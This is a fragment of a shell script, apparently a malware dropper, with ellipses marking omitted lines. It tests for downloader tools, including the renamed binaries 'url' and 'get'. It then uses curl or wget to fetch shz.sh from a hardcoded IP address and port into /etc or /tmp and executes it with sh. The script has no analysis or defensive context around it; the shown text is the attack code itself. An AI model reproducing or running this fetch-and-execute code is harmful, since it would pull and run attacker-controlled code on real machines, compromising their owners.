	...
	then
		...
		if [ -f "$shdir" ]
			then
				...
				if [ -f "$bbdir" ]
				then
					curl --connect-timeout 10 --retry 10 http://140.143.35.89:43768/shz.sh > /etc/shz.sh
				elif [ -f "$bbdira" ]
				then
					url --connect-timeout 10 --retry 10 http://140.143.35.89:43768/shz.sh > /etc/shz.sh
				elif [ -f "$ccdir" ]
				then
					wget --timeout=10 --tries=10 -P /etc http://140.143.35.89:43768/shz.sh
				elif [ -f "$ccdira" ]
				then
					get --timeout=10 --tries=10 -P /etc http://140.143.35.89:43768/shz.sh
				fi
				sh /etc/shz.sh
		fi
	else
		...
		if [ -f "$shdir" ]
			then
				...
				if [ -f "$bbdir" ]
				then
					curl --connect-timeout 10 --retry 10 http://140.143.35.89:43768/shz.sh > /tmp/shz.sh
				elif [ -f "$bbdira" ]
				then
					url --connect-timeout 10 --retry 10 http://140.143.35.89:43768/shz.sh > /tmp/shz.sh
				elif [ -f "$ccdir" ]
				then
					wget --timeout=10 --tries=10 -P /tmp http://140.143.35.89:43768/shz.sh
				elif [ -f "$ccdira" ]
				then
					get --timeout=10 --tries=10 -P /tmp http://140.143.35.89:43768/shz.sh
				fi
				sh /tmp/shz.sh
		fi
fi
